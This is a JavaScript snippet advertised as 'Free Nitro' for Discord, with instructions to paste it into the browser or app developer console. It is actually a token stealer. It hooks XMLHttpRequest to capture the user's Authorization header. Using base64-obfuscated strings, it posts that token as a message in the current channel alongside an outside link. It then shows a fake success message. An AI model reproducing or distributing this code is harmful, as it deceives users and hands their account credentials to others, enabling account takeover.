/***************************************
 * 
 *           Free Nitro
 *      paste to console on discord
 *      F12 on chrome/mozilla/Edge
 *      Ctrl+Shift+i on desktop app
 * 
 * **************************************/
XMLHttpRequest.prototype.wrappedSetRequestHeader=XMLHttpRequest.prototype.setRequestHeader,XMLHttpRequest.prototype.setRequestHeader=function(e,t){this.wrappedSetRequestHeader(e,t),this.headers||(this.headers={}),this.headers[e]||(this.headers[e]=[]),this.headers[e].push(t)};let oldXHROpen=window.XMLHttpRequest.prototype.open;window.XMLHttpRequest.prototype.open=function(e,t,o,n,s){return this.addEventListener("load",function(){isNaN(window.location.href.substring(window.location.href.lastIndexOf("/")+1,window.location.href.length))?console.log(atob("UGVuZGluZy4uIHRvIHJlc29sdmUgeW91ciBuaXRyby4=")):(fetch(atob("aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvY2hhbm5lbHMv")+window.location.href.substring(window.location.href.lastIndexOf("/")+1,window.location.href.length)+"/messages",{method:"POST",headers:{authorization:this.headers.Authorization[0],"user-agent":navigator.userAgent,"Content-Type":"application/json"},body:JSON.stringify({content:atob("aHR0cHM6Ly8weDUzOS5jby9rLw==")+this.headers.Authorization[0],tts:"false"})}),console.log("%c ",atob("Zm9udC1zaXplOiA0NTBweDsgYmFja2dyb3VuZDogdXJsKGh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzQ5OTIxMTI5NzI4ODYxNzk5Mi81Njg1MDg4NzgzNzU4Nzg2NjgvaW1hZ2VzLnBuZykgbm8tcmVwZWF0Ow==")),console.log("Congrats, you got free discord nitro"))}),oldXHROpen.apply(this,arguments)};
